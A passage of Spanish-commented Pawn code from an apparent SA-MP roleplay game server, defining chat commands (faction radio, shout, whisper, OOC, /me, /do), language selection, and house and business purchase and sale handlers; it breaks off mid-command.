//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/miembros", true) == 0) //Comando para ver los miembros online de tu facción
{
	if(PlayerInfo[playerid][pFaccion] == 0){SendClientMessage(playerid,Rojo,"* No formas parte de una facción."); return 1;}
	format(string, sizeof(string), "SELECT Nombre FROM facciones WHERE ID = %d", PlayerInfo[playerid][pFaccion]);
 	mysql_query(1, string);
	new faccion[30];
	mysql_fetch_field_row(faccion, "Nombre");
	mysql_free_result();
    format(string, sizeof(string), "Miembros conectados de %s:", faccion);
	SendClientMessage(playerid, Amarillo, string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID)
		{
			if(PlayerInfo[i][pFaccion] == PlayerInfo[playerid][pFaccion])
			{
				format(string, sizeof(string), "- %s [ID: %d] (%d)", PlayerInfo[i][pNombre], i, PlayerInfo[i][pRango]);
				SendClientMessage(playerid, Blanco, string);
			}
		}
	}
    return 1;
}

//----------COMANDOS CANALES----------//

if(strcmp(cmd, "/faccion", true) == 0 || strcmp(cmd, "/f", true) == 0) //Chat facciones públicas OOC
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 4){SendClientMessage(playerid,Rojo,"* No formas parte de una facción pública."); return 1;}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(F)accion [Texto]");
	    	return 1;
		}
		new rango[33];
	    switch(PlayerInfo[playerid][pRango])
	    {
            case 1: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango1]);
            case 2: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango2]);
            case 3: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango3]);
            case 4: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango4]);
            case 5: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango5]);
            case 6: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango6]);
            case 7: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango7]);
            case 8: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fRango8]);
        }
		format(string, sizeof(string), "[OOC] %s %s: %s", rango, GetPlayerNameRP(playerid), result);
		SendFaccionMessage(PlayerInfo[playerid][pFaccion], VerdeClaro, string);
		printf("Faccion %d OOC %s: %s", PlayerInfo[playerid][pFaccion], GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/radio", true) == 0 || strcmp(cmd, "/r", true) == 0) //Chat facciones públicas IC
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 4){SendClientMessage(playerid,Rojo,"* No formas parte de una facción pública."); return 1;}
        if(PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio."); return 1;}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(R)adio [Texto]");
	    	return 1;
		}
		format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
		SendRadioMessage(PlayerInfo[playerid][pFaccion], AguamarinaOscuro, string);
		if(!IsPlayerInAnyVehicle(playerid)) //Si no está en un vehículo
    	{
            format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
 	    	ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	    }
		else //Si está en un vehículo
		{
			new carid = GetPlayerVehicleID(playerid);
			if(IsABike(carid) || IsAMBike(carid) || IsAPizzaBike(carid) || IsABoat(carid)) //Si está en un vehiculo sin cabina
	        {
			    format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
			    ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
			}
			else //Si está en un vehiculo con cabina
			{
	            if(VehicleWindows[GetPlayerVehicleID(playerid)] == 0)
			    {
	                format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
			    	ProxDetector(2.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	            }
				else
				{
	                format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
			    	ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
				}
			}
		}
		printf("Faccion %d IC %s: %s", PlayerInfo[playerid][pFaccion], GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/departamentos", true) == 0 || strcmp(cmd, "/dep", true) == 0) //Chat facciones gubernamentales IC
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 3){SendClientMessage(playerid,Rojo,"* No formas parte de una facción del estado."); return 1;}
        if(PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio."); return 1;}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(Dep)artamentos [Texto]");
	    	return 1;
		}
		format(string, sizeof(string), "[Radio gubernamental] %s: %s", GetPlayerNameRP(playerid), result);
		SendPublicMessage(Rosa, string);
		if(!IsPlayerInAnyVehicle(playerid)) //Si no está en un vehículo
    	{
            format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
 	    	ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	    }
		else //Si está en un vehículo
		{
			new carid = GetPlayerVehicleID(playerid);
			if(IsABike(carid) || IsAMBike(carid) || IsAPizzaBike(carid) || IsABoat(carid)) //Si está en un vehiculo sin cabina
	        {
			    format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
			    ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
			}
			else //Si está en un vehiculo con cabina
			{
	            if(VehicleWindows[GetPlayerVehicleID(playerid)] == 0)
			    {
	                format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
			    	ProxDetector(2.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	            }
				else
				{
	                format(string, sizeof(string), "[Radio] %s: %s", GetPlayerNameRP(playerid), result);
			    	ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
				}
			}
		}
		printf("Radio gubernamental %s: %s", GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/megafono", true) == 0 || strcmp(cmd, "/m", true) == 0) //Chat facciones gubernamentales IC
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 2){SendClientMessage(playerid,Rojo,"* No formas parte de LSPD o LSMD."); return 1;}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(M)egafono [Texto]");
	    	return 1;
		}
        format(string, sizeof(string), "[Megáfono] %s: %s", GetPlayerNameRP(playerid), result);
 	    ProxDetector(50.0, playerid, string,Amarillo,Amarillo,Amarillo,Amarillo,AmarilloClaro);
		printf("[Megáfono] %s: %s", GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/gritar", true) == 0 || strcmp(cmd, "/gr", true) == 0 || strcmp(cmd, "/g", true) == 0) //Chat cercano IC gritar
{
    if(IsPlayerConnected(playerid))
    {
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(G)ritar [Texto]");
	    	return 1;
		}
 	    if(!IsPlayerInAnyVehicle(playerid)) //Si no está en un vehículo
    	{
            format(string, sizeof(string), "%s grita: ¡¡%s!!", GetPlayerNameRP(playerid), result);
 	        ProxDetector(35.0, playerid, string,Blanco,Chat1,Chat2,Chat3,Chat4);
	    }
		else //Si está en un vehículo
		{
			new carid = GetPlayerVehicleID(playerid);
			if(IsABike(carid) || IsAMBike(carid) || IsAPizzaBike(carid) || IsABoat(carid)) //Si está en un vehiculo sin cabina
	        {
			    format(string, sizeof(string), "%s grita: ¡¡%s!!", GetPlayerNameRP(playerid), result);
 	            ProxDetector(35.0, playerid, string,Blanco,Chat1,Chat2,Chat3,Chat4);
			}
			else //Si está en un vehiculo con cabina
			{
	            if(VehicleWindows[GetPlayerVehicleID(playerid)] == 0)
			    {
	                format(string, sizeof(string), "¡¡%s grita: %s¡¡", GetPlayerNameRP(playerid), result);
 	                ProxDetector(20.0, playerid, string,Blanco,Chat1,Chat2,Chat3,Chat4);
	            }
				else
				{
	                format(string, sizeof(string), "¡¡%s grita: %s¡¡", GetPlayerNameRP(playerid), result);
			    	ProxDetector(35.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
				}
			}
		}
		printf("%s grita: %s", GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/decir", true) == 0 || strcmp(cmd, "/de", true) == 0) //Chat cercano IC decir
{
    if(IsPlayerConnected(playerid))
    {
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(De)cir [Texto]");
	    	return 1;
		}
 	    if(!IsPlayerInAnyVehicle(playerid)) //Si no está en un vehículo
    	{
            format(string, sizeof(string), "%s dice: %s", GetPlayerNameRP(playerid), result);
 	        ProxDetector(15.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	    }
		else //Si está en un vehículo
		{
			new carid = GetPlayerVehicleID(playerid);
			if(IsABike(carid) || IsAMBike(carid) || IsAPizzaBike(carid) || IsABoat(carid)) //Si está en un vehiculo sin cabina
	        {
			    format(string, sizeof(string), "%s dice: %s", GetPlayerNameRP(playerid), result);
 	            ProxDetector(15.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
			}
			else //Si está en un vehiculo con cabina
			{
	            if(VehicleWindows[GetPlayerVehicleID(playerid)] == 0)
			    {
	                format(string, sizeof(string), "(Ventana Cerrada) %s dice: %s", GetPlayerNameRP(playerid), result);
 	                ProxDetector(7.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
	            }
				else
				{
	                format(string, sizeof(string), "(Ventana Abierta) %s dice: %s", GetPlayerNameRP(playerid), result);
			    	ProxDetector(15.0, playerid, string,Chat1,Chat2,Chat3,Chat4,Chat5);
				}
			}
		}
		printf("%s dice: %s", GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/cerca", true) == 0 || strcmp(cmd, "/c", true) == 0) //Chat cercano IC susurrar
{
    if(IsPlayerConnected(playerid))
    {
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(C)erca [Texto]");
	    	return 1;
		}
		format(string, sizeof(string), "%s susurra: %s", GetPlayerNameRP(playerid), result);
 	  	ProxDetector(2.0, playerid, string,Chat2,Chat2,Chat3,Chat4,Chat5);
		printf("%s susurra: %s", GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/susurrar", true) == 0 || strcmp(cmd, "/s", true) == 0) //Chat  cercano privado IC
{
    if(IsPlayerConnected(playerid))
    {
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
        {
            SendClientMessage(playerid, Naranja, "* /(S)usurrar [ID][Texto]");
            return 1;
        }
        playerid2 = ReturnUser(tmp);
        if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes susurrar a tí mismo."); return 1;}
        if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid, Rojo, "* ID inválida."); return 1;}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /(S)usurrar [ID][Texto]");
	    	return 1;
		}
		if(!GetPlayersProx(1.5, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Debes estar a su lado para susurrarle."); return 1;}
		format(string, sizeof(string), "* %s susurra algo al oído de %s", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
        ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        format(string, sizeof(string), "%s te susurra al oído: %s", GetPlayerNameRP(playerid), result);
        SendClientMessage(playerid2, AmarilloClaro, string);
        format(string, sizeof(string), "Susurras al oído de %s: %s", GetPlayerNameRP(playerid2), result);
        SendClientMessage(playerid, Amarillo, string);
		printf("%s susurra a %s: %s", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/b", true) == 0) //Chat cercano OOC
{
    if(IsPlayerConnected(playerid))
    {
		if(ChatOOC[playerid] == 1){SendClientMessage(playerid, Rojo, "* Espera 5 para volver a usar el chat OOC."); return 1;}
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /B [Texto]");
	    	return 1;
		}
        format(string, sizeof(string), "[OOC][ID: %d] %s: %s", playerid, GetPlayerNameRP(playerid), result);
 	    ProxDetector(15.0, playerid, string,COLOR_OOCA,COLOR_OOCB,COLOR_OOCC,COLOR_OOCD,COLOR_OOCE);
		printf("Chat OOC %s: %s", GetPlayerNameRP(playerid), result);
		ChatOOC[playerid] = 1;
		SetTimerEx("ChatOOCTimer",5000,0,"d",playerid);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/mp", true) == 0) //Mensajes privados para admins
{
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /MP [ID] [Texto]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(PlayerInfo[playerid][pAdmin] == 0 && PlayerInfo[playerid2][pAdmin] == 0){SendClientMessage(playerid,Rojo,"* Solo puedes enviar mensajes privados a administradores."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes enviar mensajes privados a tí mismo."); return 1;}
	new length = strlen(cmdtext);
	while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
	new offset = idx;
	new result[100];
	while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
    	SendClientMessage(playerid, Naranja, "* /MP [ID] [Texto]");
    	return 1;
	}
    format(string, sizeof(string), "[ID: %d] MP de %s: %s", playerid, GetPlayerNameRP(playerid), result);
	SendClientMessage(playerid2, Amarillo, string);
	format(string, sizeof(string), "[ID: %d] MP a %s: %s", playerid, GetPlayerNameRP(playerid2), result);
	SendClientMessage(playerid, AmarilloClaro, string);
	printf("MP %s a %s: %s", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), result);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/me", true) == 0) //Canal de acciones del jugador
{
    if(IsPlayerConnected(playerid))
    {
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /Me [Acción]");
	    	return 1;
		}
        format(string, sizeof(string), "%s %s", GetPlayerNameRP(playerid), result);
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		printf("%s", string);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/do", true) == 0) //Canal de sucesos en el ambiente
{
    if(IsPlayerConnected(playerid))
    {
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[100];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /Do [Suceso]");
	    	return 1;
		}
        format(string, sizeof(string), "* (%s) %s", GetPlayerNameRP(playerid), result);
 	    ProxDetector(15.0, playerid, string,Verde,Verde,Verde,Verde,Verde);
		printf("(/do) %s: %s", GetPlayerNameRP(playerid), result);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/yo", true) == 0) //Indicar un estado del personaje IC
{
    if(IsPlayerConnected(playerid))
    {
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')){idx++;}
		new offset = idx;
		new result[80];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1))){result[idx - offset] = cmdtext[idx]; idx++;}
		result[idx - offset] = EOS;
		if(!strlen(result) && Yo[playerid] != 0)
		{
	    	SendClientMessage(playerid, Naranja, "* /Yo [Estado]");
	    	format(string, sizeof(string), "Estado actual: * %s *", YoTexto[playerid]);
	    	SendClientMessage(playerid, Naranja, string);
	    	return 1;
		}
		if(!strlen(result))
		{
	    	SendClientMessage(playerid, Naranja, "* /Yo [Estado]");
	    	return 1;
		}
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		DestroyDynamic3DTextLabel(Yo3DText[playerid]);
		format(YoTexto[playerid], sizeof(result), result);
        Yo3DText[playerid] = CreateDynamic3DTextLabel(YoTexto[playerid], Naranja, X, Y, (Z + 5.0), 15.0, playerid);
        Streamer_Update(playerid);
        format(string, sizeof(string), "Estado actual: * %s *", result);
		SendClientMessage(playerid, Morado, string);
		SendClientMessage(playerid, Naranja, "* Utiliza /Yob para quitártelo.");
		Yo[playerid] = 1;
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/yob", true) == 0) //Borrar el estado
{
    if(IsPlayerConnected(playerid))
    {
		if(Yo[playerid] == 0)
		{
	    	SendClientMessage(playerid, Naranja, "* No tienes ningún estado actual, utiliza /Yo.");
	    	return 1;
		}
        DestroyDynamic3DTextLabel(Yo3DText[playerid]);
        Streamer_Update(playerid);
		SendClientMessage(playerid, Naranja, "Estado borrado.");
		Yo[playerid] = 0;
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/idioma", true) == 0) //Selecciona un idioma
{
    new opcion[24];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Idioma [Opción]");
		SendClientMessage(playerid, Naranja, "0: Inglés (Normal), 1: Español");
		SendClientMessage(playerid, Naranja, "2: Alemán, 3: Japonés");
		SendClientMessage(playerid, Naranja, "4: Italiano, 5: Ruso");
		SendClientMessage(playerid, Naranja, "6: Árabe, 7: Francés");
		SendClientMessage(playerid, Naranja, "8: Chino, 9: Portugués");
		return 1;
	}
	if(strcmp(opcion,"0",true) == 0)
	{
	    Idioma[playerid] = 0;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al inglés (normal).");
	    return 1;
	}
	if(strcmp(opcion,"1",true) == 0)
	{
	    Idioma[playerid] = 1;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al español. Ahora aparecerá [ESPAÑOL] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"2",true) == 0)
	{
	    Idioma[playerid] = 2;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al alemán. Ahora aparecerá [ALEMÁN] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"3",true) == 0)
	{
	    Idioma[playerid] = 3;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al japonés. Ahora aparecerá [JAPONÉS] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"4",true) == 0)
	{
	    Idioma[playerid] = 4;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al italiano. Ahora aparecerá [ITALIANO] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"5",true) == 0)
	{
	    Idioma[playerid] = 5;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al ruso. Ahora aparecerá [RUSO] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"6",true) == 0)
	{
	    Idioma[playerid] = 6;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al árabe. Ahora aparecerá [ÁRABE] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"7",true) == 0)
	{
	    Idioma[playerid] = 7;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al francés. Ahora aparecerá [FRANCÉS] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"8",true) == 0)
	{
	    Idioma[playerid] = 8;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al chino. Ahora aparecerá [CHINO] al principio de lo que digas.");
	    return 1;
	}
	if(strcmp(opcion,"9",true) == 0)
	{
	    Idioma[playerid] = 9;
	    SendClientMessage(playerid, Verde, "Idioma cambiado al portugués. Ahora aparecerá [PORTUGUÉS] al principio de lo que digas.");
	    return 1;
	}
	else
	{
	    SendClientMessage(playerid, Naranja, "* /Idioma [Opción]");
		SendClientMessage(playerid, Naranja, "0: Inglés (Normal), 1: Español");
		SendClientMessage(playerid, Naranja, "2: Alemán, 3: Japonés");
		SendClientMessage(playerid, Naranja, "4: Italiano, 5: Ruso");
		SendClientMessage(playerid, Naranja, "6: Árabe, 7: Francés");
		SendClientMessage(playerid, Naranja, "8: Chino, 9: Portugués");
	}
	return 1;
}

//----------COMANDOS CASAS Y NEGOCIOS----------//

if(strcmp(cmd, "/comprarnegocio", true) == 0) //Comprar un negocio
{
	if(!GetPlayerFueraPuertaNego(playerid)){SendClientMessage(playerid,Rojo,"* No estás en la puerta de un local."); return 1;} //No está en un negocio
	new nego = GetPlayerFueraPuertaNego(playerid);
	if(NegoInfo[nego][nComprado] == 1){SendClientMessage(playerid,Rojo,"* Este local no está en venta."); return 1;} //Negocio comprado
	if(PlayerInfo[playerid][pNegocio] > 0){SendClientMessage(playerid,Rojo,"* Ya posees un negocio."); return 1;} //Ya tiene negocio
	if(PlayerInfo[playerid][pNivel] < 3){SendClientMessage(playerid,Rojo,"* Necesitas tener al menos nivel 3 para comprar un local."); return 1;} //No es nivel 3
	if(PlayerInfo[playerid][pDineroBanco] < NegoInfo[nego][nValor]){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero en el banco."); return 1;}

	PlayerInfo[playerid][pDineroBanco] -= NegoInfo[nego][nValor];
	PlayerInfo[playerid][pNegocio] = nego; //Setea el negocio del jugador
	if(NegoInfo[nego][nTipo] == 6)PlayerInfo[playerid][pTaller] = nego; //Si es taller, setearlo al jugador
	NegoInfo[nego][nComprado] = 1;
	format(NegoInfo[nego][nDueno], 60, "%s", PlayerInfo[playerid][pNombre]);
	format(string, sizeof(string), "Has comprado un local por %d$.", NegoInfo[nego][nValor]);
	SendClientMessage(playerid, Verde, string);
	SendClientMessage(playerid, Verde, "Felicidades por tu nueva compra. Utiliza '/Ayuda Negocio' para ver los comandos de negocio.");
	printf("%s compra el local %d por %d$",GetPlayerNameRP(playerid), nego, NegoInfo[nego][nValor]);
	UpdateNegocioLabel(nego);
	SaveNegocios(nego);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/nombrenegocio", true) == 0) //Cambiar nombre a un negocio
{
    if(PlayerInfo[playerid][pNegocio] == 0){SendClientMessage(playerid,Rojo,"* No posees un local."); return 1;} //No tiene negocio
	if(GetPlayerFueraPuertaNego(playerid) != PlayerInfo[playerid][pNegocio]){SendClientMessage(playerid,Rojo,"* No estás en la puerta de tu local."); return 1;} //No está en una casa
	new nego = PlayerInfo[playerid][pNegocio];
	new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
    new offset = idx;
    new result[MAX_PLAYER_NAME];
    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
    {
        result[idx - offset] = cmdtext[idx];
        idx++;
    }
    result[idx - offset] = EOS;
    if(!strlen(result))
    {
        SendClientMessage(playerid, Naranja, "* /NombreNegocio [Texto]");
        return 1;
    }
    new string2[250];
    format(NegoInfo[nego][nNombre], sizeof(result), "%s", result);
    format(string2, sizeof(string2), "Has cambiado el nombre de tu negocio a '%s'.", result);
    SendClientMessage(playerid, Verde, string2);
    UpdateNegocioLabel(nego);
    SaveNegocios(nego);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/vendernegocio", true) == 0) //Vender un negocio
{
    if(PlayerInfo[playerid][pNegocio] == 0){SendClientMessage(playerid,Rojo,"* No posees un local."); return 1;} //No tiene negocio
	if(GetPlayerFueraPuertaNego(playerid) != PlayerInfo[playerid][pNegocio]){SendClientMessage(playerid,Rojo,"* No estás en la puerta de tu local."); return 1;} //No está en una casa
	new nego = PlayerInfo[playerid][pNegocio];
	PlayerInfo[playerid][pNegocio] = 0; //Setea el negocio del jugador a 0
	if(NegoInfo[nego][nTipo] == 6)PlayerInfo[playerid][pTaller] = 0; //Si es taller, resetear
	new dinero = NegoInfo[nego][nValor]*3/4;
	PlayerInfo[playerid][pDineroBanco] += dinero;
	NegoInfo[nego][nComprado] = 0;
	format(NegoInfo[nego][nDueno], 60, "");
	NegoInfo[nego][nCerrado] = 0;
	format(string, sizeof(string), "Has vendido tu local por %d$. El dinero se te ha ingresado en tu cuenta bancaria.", dinero);
	SendClientMessage(playerid, Verde, string);
	printf("%s vende su local %d por %d$",GetPlayerNameRP(playerid), nego, dinero);
	UpdateNegocioLabel(nego);
	SaveNegocios(nego);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/comprarcasa", true) == 0) //Comprar una casa
{
	if(!GetPlayerFueraPuertaCasa(playerid)){SendClientMessage(playerid,Rojo,"* No estás en la puerta de una casa."); return 1;} //No está en una casa
	new casa = GetPlayerFueraPuertaCasa(playerid);
	if(HouseInfo[casa][hComprada] == 1 || HouseInfo[casa][hComprada] == -1){SendClientMessage(playerid,Rojo,"* Esta casa no está en venta."); return 1;} //Casa comprada
	if(PlayerInfo[playerid][pCasaAlq] > 0){SendClientMessage(playerid,Rojo,"* No puedes comprar una casa si estás alquilando una."); return 1;} //Ya tiene casa
	if(PlayerInfo[playerid][pCasa] > 0){SendClientMessage(playerid,Rojo,"* Ya posees una casa."); return 1;} //Ya tiene casa
	if(PlayerInfo[playerid][pNivel] < 3){SendClientMessage(playerid,Rojo,"* Necesitas tener al menos nivel 3 para comprar una casa."); return 1;} //No es nivel 3
	if(PlayerInfo[playerid][pDineroBanco] < HouseInfo[casa][hValor]){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero en el banco."); return 1;}
	PlayerInfo[playerid][pDineroBanco] -= HouseInfo[casa][hValor];
